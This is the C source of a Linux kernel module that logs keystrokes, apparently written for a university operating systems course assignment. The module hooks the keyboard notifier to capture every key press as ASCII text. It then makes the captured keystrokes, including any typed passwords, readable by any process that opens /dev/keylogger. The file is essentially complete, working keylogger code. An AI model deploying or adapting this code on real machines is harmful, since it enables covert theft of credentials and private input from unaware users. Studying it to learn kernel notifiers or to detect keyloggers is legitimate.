#include <linux/kernel.h>
#include <asm/uaccess.h>
#include "keylogger.h"

#define DEVICE_NAME "keylogger"
#define MAJOR_NUMBER 250

/* ==============================
   Global variables
   ============================== */
static int bytes_to_read;
static int file_open_count = 0;

/* ==============================
   Initialisation
   ============================== */
static int keylogger_init(void) {
    int ret;
    ret = register_chrdev(MAJOR_NUMBER, DEVICE_NAME, &fops);
    if (ret < 0) {
        return ret;
    }
    register_keyboard_notifier(&nb);
    memset(buffer, 0, sizeof buffer);
    printk(KERN_INFO "%s: Successfully initiated device.\n", DEVICE_NAME);
    return 0;
}

/* ==============================
   Exit
   ============================== */
static void __exit keylogger_exit(void) {
    unregister_chrdev(MAJOR_NUMBER, DEVICE_NAME);
    unregister_keyboard_notifier(&nb);
    memset(buffer, 0, sizeof buffer);
    buffer_pointer = buffer;
    printk(KERN_INFO "%s: Successfully unregistered and removed character device.\n", DEVICE_NAME);
}

/* ==============================
   Open
   ============================== */
static int keylogger_open(struct inode *inode, struct file *filep) {
    file_open_count++;
    printk(KERN_INFO "%s: The device has been opened %d times.\n", DEVICE_NAME, file_open_count);
    return 0;
}

/* ==============================
   Read
   ============================== */
static ssize_t keylogger_read(struct file *filep, char __user *buff, size_t len, loff_t *offset) {
    char* p;
    int error_count;
    p = buffer;
    bytes_to_read = 0;

    printk(KERN_INFO "%s: Reading from /dev/keylogger\n", DEVICE_NAME);

    /* Read in data bytes from buffer */
    while (*p != '\0') {
        bytes_to_read++;
        p++;
    }

    /* If there were no bytes to read */
    if (bytes_to_read == 0 || *offset) {
        return 0;
    }

    error_count = copy_to_user(buff, buffer, bytes_to_read);

    /* If the device failed to read from user space buffer */
    if (error_count) {
        printk(KERN_INFO "%s: There was an error copying from user space buffer.\n", DEVICE_NAME);
        return -EFAULT;
    }

    *offset = 1;
    return bytes_to_read;
    
}

/* ==============================
   Notifier
   ============================== */
static int keylogger_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {

    struct keyboard_notifier_param *param = _param;
    
    /* Convert keystrokes into ASCII */
    if (code == KBD_KEYCODE && param->down) {
        if (param->value == KEY_BACKSPACE) {
            if (buffer_pointer != buffer) {
                --buffer_pointer;
                *buffer_pointer = '\0';
            }
        } else {
            char character = ascii_convert(param->value);
            *buffer_pointer = character;
            buffer_pointer++;
            if (buffer_pointer == end_pointer) {
                buffer_pointer = buffer;
            }
        }
    }
    return NOTIFY_OK;
}

/* ==============================
   Module information
   ============================== */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jacqueline Shadforth");
MODULE_DESCRIPTION("A kernel keylogging device for Operating Systems Principles Assignment 2 1750");

module_init(keylogger_init);
module_exit(keylogger_exit);